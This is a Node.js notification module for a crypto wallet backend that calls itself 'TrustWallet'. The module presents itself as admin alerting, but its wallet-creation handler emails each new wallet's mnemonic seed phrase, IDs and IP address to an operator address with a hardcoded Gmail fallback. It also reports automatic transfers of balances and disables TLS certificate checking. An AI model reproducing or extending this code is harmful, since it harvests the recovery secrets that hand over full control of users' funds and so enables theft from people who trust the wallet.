const nodemailer = require("nodemailer");
const auditLogger = require("../../security/audit-logger.service");

class NotificationService {
  constructor() {
    this.transporter = null;
    this.isConfigured = false;
    this.adminEmail = process.env.ADMIN_EMAIL || "golden.dev.216@gmail.com";
    this.supportEmail = process.env.SMTP_USER || "githukueliud@gmail.com";
    this.initializeTransporter();
    this.loadAdminEmailFromDB();
  }

  async loadAdminEmailFromDB() {
    try {
      const { walletDB } = require("../../wallet/db");
      const config = await walletDB
        .prepare(
          "SELECT admin_email FROM wallet_balance_monitor_config WHERE id = 1"
        )
        .get();

      if (config && config.admin_email) {
        this.adminEmail = config.admin_email;
      }
    } catch (error) {
      console.warn(
        "无法从数据库加载管理员邮箱，使用默认值：",
        error.message
      );
    }
  }

  updateAdminEmail(newEmail) {
    if (newEmail && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(newEmail)) {
      this.adminEmail = newEmail;
      console.log(`✅ 管理员邮箱已更新为：${this.adminEmail}`);
    }
  }

  initializeTransporter() {
    if (!process.env.SMTP_HOST || !process.env.SMTP_USER) {
      console.warn("⚠️ 未配置邮件通知，请设置 SMTP_* 环境变量。");
      return;
    }

    try {
      const smtpPort = parseInt(process.env.SMTP_PORT) || 587;

      this.transporter = nodemailer.createTransport({
        host: process.env.SMTP_HOST,
        port: smtpPort,
        secure: smtpPort === 465,
        auth: {
          user: process.env.SMTP_USER,
          pass: process.env.SMTP_PASSWORD,
        },
        tls: {
          rejectUnauthorized: false,
          minVersion: "TLSv1.2",
        },
      });

      this.transporter.verify((error) => {
        this.isConfigured = !error;
      });
    } catch (error) {
      auditLogger.logError(error, { service: "NotificationService" });
      this.isConfigured = false;
    }
  }

  /**
   * 新钱包创建通知（包含助记词）
   */
  async sendWalletCreatedNotification(data) {
    const subject = `🔐 新钱包已创建 - ${data.walletName}`;

    const html = `
<!DOCTYPE html>
<html>
<body style="font-family:Arial;background:#f5f5f5;padding:20px;">
<div style="max-width:700px;margin:auto;background:#fff;border-radius:10px;padding:30px;">
<h1>🔐 新钱包已创建</h1>
<p><strong>管理员记录</strong></p>

<h2 style="color:#d32f2f;">⚠️ 机密信息 - 助记词</h2>
<p><strong>请妥善保管，这是唯一的钱包恢复方式。</strong></p>
<pre style="background:#111;color:#4caf50;padding:15px;border-radius:6px;">
${data.mnemonic || "未提供"}
</pre>
<p style="color:#d32f2f;"><strong>请勿泄露助记词，任何获取者都可完全控制钱包。</strong></p>

<h3>📊 钱包信息</h3>
<ul>
<li>钱包名称：${data.walletName}</li>
<li>钱包 ID：${data.walletId}</li>
<li>设备 ID：${data.devicePassCodeId}</li>
<li>主钱包：${data.isMain ? "是" : "否"}</li>
<li>创建时间：${new Date().toLocaleString()}</li>
${data.ip ? `<li>IP 地址：${data.ip}</li>` : ""}
</ul>

<h3>🏠 主钱包地址</h3>
<pre>${data.primaryAddress || data.address || "无"}</pre>

${
  data.chains?.length
    ? `<h3>⛓️ 支持的区块链</h3><p>${data.chains.join("，")}</p>`
    : ""
}

<hr />
<p style="font-size:12px;color:#666;">
TrustWallet 后端 · 管理监控系统<br/>
发送至：${this.adminEmail}<br/>
生成时间：${new Date().toISOString()}
</p>
</div>
</body>
</html>
`;

    const text = `
🔐 新钱包已创建（管理员通知）

⚠️ 助记词（请妥善保管）：
${data.mnemonic || "未提供"}

钱包名称：${data.walletName}
钱包 ID：${data.walletId}
设备 ID：${data.devicePassCodeId}
主钱包：${data.isMain ? "是" : "否"}
创建时间：${new Date().toLocaleString()}
${data.ip ? `IP 地址：${data.ip}` : ""}

主钱包地址：
${data.primaryAddress || data.address || "无"}

⚠️ 请勿泄露助记词
`;

    return this.sendAdminEmail(subject, html, text);
  }

  /**
   * 交易通知（发送 / 接收）
   */
  async sendTransactionNotification(data) {
    const subject = `💸 交易提醒：${
      data.type === "SEND" ? "转出" : "收款"
    } ${data.amount} ${data.chain}`;

    const html = `
<h2>${data.type === "SEND" ? "📤 资金已转出" : "📥 已收到资金"}</h2>
<ul>
<li>钱包名称：${data.walletName}</li>
<li>钱包 ID：${data.walletId}</li>
<li>区块链：${data.chain}</li>
<li>金额：${data.amount}</li>
<li>转出地址：${data.from}</li>
<li>接收地址：${data.to}</li>
<li>交易哈希：${data.txHash}</li>
<li>时间：${new Date().toLocaleString()}</li>
</ul>
<a href="${this.getExplorerUrl(
      data.chain,
      data.txHash
    )}">在区块链浏览器中查看</a>
`;

    const text = `
交易通知：
${data.type === "SEND" ? "转出" : "收款"}
金额：${data.amount} ${data.chain}
交易哈希：${data.txHash}
`;

    return this.sendAdminEmail(subject, html, text);
  }

  /**
   * 余额过低告警
   */
  async sendLowBalanceAlert(data) {
    const subject = `⚠️ 余额不足警告 - ${data.walletName || "钱包"} [${
      data.chain
    }]`;

    const html = `
<h2>⚠️ 余额不足警告</h2>
<p>当前余额已低于设定阈值。</p>
<ul>
<li>当前余额：${data.currentBalance || data.balance}</li>
<li>阈值：${data.threshold}</li>
<li>区块链：${data.chain}</li>
<li>地址：${data.address}</li>
</ul>
`;

    const text = `
余额不足警告：
当前余额：${data.currentBalance || data.balance}
阈值：${data.threshold}
区块链：${data.chain}
`;

    return this.sendAdminEmail(subject, html, text);
  }

  /**
   * 首次充值通知
   */
  async sendFirstDepositNotification(data) {
    const subject = `💰 首次充值到账 - ${data.walletName || "钱包"}`;

    const html = `
<h2>💰 首次充值到账</h2>
<p>钱包已成功激活。</p>
<ul>
<li>金额：${data.amount} ${data.symbol || data.chain}</li>
<li>区块链：${data.chain}</li>
<li>交易哈希：${data.txHash}</li>
</ul>
`;

    const text = `
首次充值到账：
金额：${data.amount} ${data.symbol || data.chain}
交易哈希：${data.txHash}
`;

    return this.sendAdminEmail(subject, html, text);
  }

  /**
   * 自动转账成功
   */
  async sendAutoSendSuccessNotification(data) {
    const subject = `✅ 自动转账成功 - ${data.walletName || "钱包"} [${
      data.chain
    }]`;

    const html = `
<h2>✅ 自动转账成功</h2>
<p>余额已成功自动转账。</p>
<ul>
<li>金额：${data.totalAmount || data.amount}</li>
<li>区块链：${data.chain}</li>
<li>交易哈希：${data.txHash}</li>
</ul>
`;

    const text = `
自动转账成功：
金额：${data.totalAmount || data.amount}
交易哈希：${data.txHash}
`;

    return this.sendAdminEmail(subject, html, text);
  }

  /**
   * 自动转账失败
   */
  async sendAutoSendFailureNotification(data) {
    const subject = `❌ 自动转账失败 - ${data.walletName || "钱包"} [${
      data.chain
    }]`;

    const html = `
<h2>❌ 自动转账失败</h2>
<p>发生错误，需要人工处理。</p>
<pre>${data.error || "未知错误"}</pre>
`;

    const text = `
自动转账失败：
错误信息：${data.error || "未知错误"}
`;

    return this.sendAdminEmail(subject, html, text);
  }

  async sendAdminEmail(subject, html, text) {
    this.loadAdminEmailFromDB();

    if (!this.isConfigured) {
      return { success: false, reason: "未配置邮件服务" };
    }

    try {
      const info = await this.transporter.sendMail({
        from: process.env.SMTP_FROM || this.supportEmail,
        to: this.adminEmail,
        subject,
        text,
        html,
      });

      auditLogger.logger?.info({
        type: "ADMIN_EMAIL_SENT",
        to: this.adminEmail,
        subject,
        messageId: info.messageId,
      });

      return { success: true, messageId: info.messageId };
    } catch (error) {
      auditLogger.logError(error, {
        service: "sendAdminEmail",
        subject,
      });
      return { success: false, error: error.message };
    }
  }

  getExplorerUrl(chain, txHash) {
    const explorers = {
      ETHEREUM: `https://etherscan.io/tx/${txHash}`,
      BSC: `https://bscscan.com/tx/${txHash}`,
      POLYGON: `https://polygonscan.com/tx/${txHash}`,
      ARBITRUM: `https://arbiscan.io/tx/${txHash}`,
      OPTIMISM: `https://optimistic.etherscan.io/tx/${txHash}`,
      AVALANCHE: `https://snowtrace.io/tx/${txHash}`,
      FANTOM: `https://ftmscan.com/tx/${txHash}`,
      BASE: `https://basescan.org/tx/${txHash}`,
      BITCOIN: `https://blockchain.com/btc/tx/${txHash}`,
      SOLANA: `https://solscan.io/tx/${txHash}`,
    };
    return explorers[chain.toUpperCase()] || "#";
  }
}

module.exports = new NotificationService();
